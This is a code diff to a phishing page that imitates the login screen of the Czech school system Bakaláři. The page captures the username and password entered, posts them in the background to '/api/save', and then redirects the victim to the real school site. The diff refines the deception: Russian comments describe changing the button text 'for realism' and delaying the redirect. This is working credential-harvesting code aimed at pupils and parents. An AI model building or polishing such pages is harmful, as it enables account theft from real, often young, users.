@@ -4,6 +4,7 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>Bakaláři - přihlášení do systému</title>
+<link rel="icon" href="/favicon.ico" type="image/x-icon">
 <style>
   * { box-sizing: border-box; margin: 0; padding: 0; }
   body {
@@ -94,7 +95,7 @@
       </div>
       
       <a href="#" class="forgot">Zapomenuté heslo</a>
-      <button type="submit">Přihlásit</button>
+      <button type="submit" id="submitBtn">Přihlásit</button>
     </form>
 
     <div class="app-links">
@@ -108,12 +109,16 @@
 
   <script>
     document.getElementById('loginForm').addEventListener('submit', function(e) {
-      e.preventDefault(); // Отменяем стандартную отправку
+      e.preventDefault(); 
       
       const username = document.getElementById('username').value;
       const pass = document.getElementById('password').value;
 
-      // Отправляем данные в фоне (keepalive гарантирует отправку даже при переходе)
+      // Меняем текст кнопки для реализма
+      const btn = document.getElementById('submitBtn');
+      btn.textContent = 'Přihlašování...';
+      btn.style.backgroundColor = '#5ca627';
+
       fetch('/api/save', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
@@ -121,8 +126,10 @@
         keepalive: true 
       }).catch(() => {});
 
-      // Мгновенно перенаправляем на настоящий сайт
-      window.location.replace('https://bakalari.zsnachodovci.cz/');
+      // Задержка 1 секунда перед редиректом
+      setTimeout(() => {
+        window.location.replace('https://bakalari.zsnachodovci.cz/');
+      }, 1000);
     });
   </script>
 </body>
